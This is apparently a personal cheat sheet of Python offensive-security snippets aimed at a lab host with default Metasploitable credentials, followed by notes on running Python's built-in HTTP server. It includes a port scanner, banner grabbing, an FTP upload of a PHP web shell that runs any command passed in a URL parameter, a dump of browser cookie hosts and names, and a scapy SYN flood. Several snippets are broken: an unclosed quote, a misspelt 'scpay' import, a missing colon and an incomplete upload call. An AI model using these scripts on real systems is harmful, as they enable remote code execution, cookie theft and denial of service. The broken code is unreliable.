##### libraries
- **os**
```
import os
os.uname()
```

- **suprocess**
```
import subprocess

subprocess.run(['uname', '-v'])

info=subprocess.run(['uname', '-ors'],capture_output=True)
print(info.stdout.decode('utf-8'))
```

- **socket**
```
import socket
socket.setdefaulttimeout(1)

s=socket.socket()
s.connect_ex(("10.0.2.32",21))
banner=s.recv(1024)
s.close()
print(banner.decode('utf-8'))
```

- **sys**
```
import sys, socket
socket.setdefaulttimeout(1)

try:
	for i in range (1, 1024):
		s=socket.socket()
		if s.connect_ex((sys.argv[1],i))==0:
			print(sys.argv[1]+":"+str(i)+" open")
		s.close()
except:
	pass
print("\nDone")
```

- **urllib**
```
import urllib.request
url=urllib.request.urlopen('http://10.0.2.32/index.php')
print(url.read().decode('utf-8'))
```

- **ftplib**
```shelly.php
import ftplib

ftp=ftplib.FTP('10.0.2.32)
ftp.login('msfadmin', 'msfadmin')
ftp.cwd('/var/www')
ftp.dir()
```

shelly.php
```
<? php echo shell_exec($_GET['cmd']); ?>
```

```
import ftplib

ftp=ftplib.FTP('10.0.2.32)
ftp.login('msfadmin', 'msfadmin')
ftp.cwd('/var/www/dav')

f=open('shelly.php', 'rb')
ftp.storlines('STOR shelly.php')
f.close()
ftp.close()
print("RCE shell uploaded")
```

- **sqlite3**
```
import sqlite3

cs=sqlite3.connect('Cookies')
c=cs.cursor()
c.execute('SELECT name FROM sqlite_master WHERE type==\"table\";')
for row in c:
	print(row[0])
////////////////////////////////////
c.execute('SELECT * FROM cookies;')
for row in c.description:
	print(row[0])
////////////////////////////////////
c.execute('SELECT host_key,name FROM cookies;')
for row in c:
	print(row[0].ljust(24)+' '+row[1])
```

- **scapy** (for SYN floods)
```
import scpay.all import *

def flood(src,tgt):
	for port in range(1024,65536)
		send(IP(src=src,dst=tgt)/TCP(sport=4444,dport=port,flags="S"))
source="10.0.2.100"
target="10.0.2.32"
flood(source,target)
```


### Steps to create a HTTP server

```
# Create index.html
$> vim index.html
# html code of the webpage
# Create server with python 
$> python -m http.server 8081
# Enter URL "localhost:8081" in your browser
```

- A basic HTTP server will be started on your local machine, accessible by anyone (within the same network or from the local computer) at `http://localhost:8081`.
- The server will serve files from the directory in which the command was run. If you navigate to this URL, you will see the files in the current directory as a list, which can be opened in a browser.
- This server is **not intended for production use**. It's often used for development purposes or testing, such as sharing files within a local network.